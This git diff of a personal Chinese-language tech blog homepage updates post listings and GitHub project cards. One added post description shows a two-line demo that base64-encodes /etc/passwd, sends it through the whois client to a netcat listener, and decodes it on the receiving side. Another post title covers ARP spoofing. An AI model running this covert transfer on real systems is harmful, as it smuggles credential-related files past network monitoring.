@@ -122,6 +122,26 @@
                 
                 <li class="repo-list-item">
                     <h3 class="repo-list-name">
+                      <a href="/2019/12/26/native_spark-study1/">Rust Native Spark Sample Install</a>
+                    </h3>
+                    <p class="repo-list-description">
+                        本文简单介绍Rust版本的Spark 安装 以及dev版本的测试。
+                    </p>
+                    <p class="repo-list-meta">
+                        <span class="meta-info">
+                          <span class="octicon octicon-calendar"></span> 2019/12/26
+                        </span>
+                        
+                        <span class="meta-info">
+                          <span class="octicon octicon-file-directory"></span>
+                          <a href="/categories/#spark" title="spark">spark</a>
+                        </span>
+                        
+                    </p>
+                </li>
+                
+                <li class="repo-list-item">
+                    <h3 class="repo-list-name">
                       <a href="/2019/09/05/arp-dniff-url-sslniff/">Arp 欺骗获取设备信息</a>
                     </h3>
                     <p class="repo-list-description">
@@ -145,7 +165,10 @@
                       <a href="/2019/09/02/use-whois-send-file-hack/">利用Whois传输小文件。</a>
                     </h3>
                     <p class="repo-list-description">
-                        
+                        传输机：
+root@john:~# whois -h 127.0.0.1 -p 4444 `cat /etc/passwd | base64`
+接受机：
+root@john:/tmp# nc -l -v -p 4444 | sed "s/ //g" | base64 -d
                     </p>
                     <p class="repo-list-meta">
                         <span class="meta-info">
@@ -323,26 +346,6 @@
                     </p>
                 </li>
                 
-                <li class="repo-list-item">
-                    <h3 class="repo-list-name">
-                      <a href="/2018/12/26/python-logview-simple/">python 远程启动mapreduce作业</a>
-                    </h3>
-                    <p class="repo-list-description">
-                        本文基于Python2.7 进行测试
-                    </p>
-                    <p class="repo-list-meta">
-                        <span class="meta-info">
-                          <span class="octicon octicon-calendar"></span> 2018/12/26
-                        </span>
-                        
-                        <span class="meta-info">
-                          <span class="octicon octicon-file-directory"></span>
-                          <a href="/categories/#python" title="python">python</a>
-                        </span>
-                        
-                    </p>
-                </li>
-                
             </ol>
         </div>
         <div class="column one-third">
@@ -424,6 +427,35 @@
     </div>
 </a>
 
+<a href="https://github.com/uk0/OPUI" target="_blank" class="card text-center">
+    <div class="thumbnail">
+        <div class="card-image geopattern" data-pattern-id="OPUI">
+            <div class="card-image-cell">
+                <h3 class="card-title">
+                    OPUI
+                </h3>
+            </div>
+        </div>
+        <div class="caption">
+            <div class="card-description">
+                <p class="card-text"> golang gui ，mac  windows and other</p>
+            </div>
+            <div class="card-text">
+                <span class="meta-info" title="12 stars">
+                    <span class="octicon octicon-star"></span> 12
+                </span>
+                <span class="meta-info" title="7 forks">
+                    <span class="octicon octicon-git-branch"></span> 7
+                </span>
+                <span class="meta-info" title="Last updated：2019-12-25 09:33:22 UTC">
+                    <span class="octicon octicon-clock"></span>
+                    <time datetime="2019-12-25 09:33:22 UTC">2019-12-25</time>
+                </span>
+            </div>
+        </div>
+    </div>
+</a>
+
 <a href="https://github.com/uk0/OCR-NODEJS" target="_blank" class="card text-center">
     <div class="thumbnail">
         <div class="card-image geopattern" data-pattern-id="OCR-NODEJS">
@@ -447,35 +479,6 @@
                 <span class="meta-info" title="Last updated：2019-09-26 13:32:33 UTC">
                     <span class="octicon octicon-clock"></span>
                     <time datetime="2019-09-26 13:32:33 UTC">2019-09-26</time>
-                </span>
-            </div>
-        </div>
-    </div>
-</a>
-
-<a href="https://github.com/uk0/OPUI" target="_blank" class="card text-center">
-    <div class="thumbnail">
-        <div class="card-image geopattern" data-pattern-id="OPUI">
-            <div class="card-image-cell">
-                <h3 class="card-title">
-                    OPUI
-                </h3>
-            </div>
-        </div>
-        <div class="caption">
-            <div class="card-description">
-                <p class="card-text"> golang gui ，mac  windows and other</p>
-            </div>
-            <div class="card-text">
-                <span class="meta-info" title="11 stars">
-                    <span class="octicon octicon-star"></span> 11
-                </span>
-                <span class="meta-info" title="7 forks">
-                    <span class="octicon octicon-git-branch"></span> 7
-                </span>
-                <span class="meta-info" title="Last updated：2019-08-30 01:34:52 UTC">
-                    <span class="octicon octicon-clock"></span>
-                    <time datetime="2019-08-30 01:34:52 UTC">2019-08-30</time>
                 </span>
             </div>
         </div>
